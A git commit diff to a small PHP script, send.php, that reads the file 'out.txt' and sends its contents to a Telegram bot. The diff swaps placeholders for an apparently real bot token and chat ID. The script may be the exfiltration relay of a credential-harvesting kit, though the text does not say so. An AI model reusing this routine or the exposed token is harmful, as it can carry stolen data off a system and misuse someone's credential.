d1c94e4e8a1400645c8c83bc7dabdaed3c17526e
Daeitorab <mohmad.zzxx.1389@gmail.com>
2024-10-02 23:47:46 +0330

    Update send.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot7054073278:AAGXFgQ8RUC2q4D1GXHh5hEYAVYUkgcuayU/sendMessage?chat_id=7311931997&text=$msg");
 ?>
